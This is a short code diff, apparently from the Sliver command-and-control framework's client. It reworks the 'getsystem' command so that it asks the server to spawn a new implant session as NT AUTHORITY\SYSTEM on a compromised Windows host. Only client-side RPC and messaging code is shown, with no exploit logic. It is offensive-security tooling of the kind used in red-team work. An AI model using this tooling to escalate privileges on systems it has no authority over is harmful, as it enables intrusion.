@@ -3,6 +3,7 @@ package command
 import (
 	"fmt"
 	"sliver/client/spin"
+	clientpb "sliver/protobuf/client"
 	sliverpb "sliver/protobuf/sliver"
 
 	"github.com/desertbit/grumble"
@@ -42,12 +43,33 @@ func getsystem(ctx *grumble.Context, rpc RPCServer) {
 		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
 		return
 	}
-	_, err := runProcessAsUser(`NT AUTHORITY\SYSTEM`, ActiveSliver.Sliver.Filename, "", rpc)
-	if err != nil {
-		fmt.Printf(err.Error())
+	config := getActiveSliverConfig()
+	ctrl := make(chan bool)
+	go spin.Until("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)
+	data, _ := proto.Marshal(&clientpb.GetSystemReq{
+		SliverID: ActiveSliver.Sliver.ID,
+		Config:   config,
+	})
+	resp := <-rpc(&sliverpb.Envelope{
+		Type: clientpb.MsgGetSystemReq,
+		Data: data,
+	}, defaultTimeout)
+	ctrl <- true
+	if resp.Err != "" {
+		fmt.Printf(Warn+"Error: %s", resp.Err)
 		return
 	}
-
+	gsResp := &sliverpb.GetSystem{}
+	err := proto.Unmarshal(resp.Data, gsResp)
+	if err != nil {
+		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
+		return
+	}
+	if gsResp.Output != "" {
+		fmt.Printf("\n"+Warn+"Error: %s\n", gsResp.Output)
+		return
+	}
+	fmt.Printf("\n" + Info + "A new SYSTEM session should pop soon...\n")
 }
 
 func elevate(ctx *grumble.Context, rpc RPCServer) {
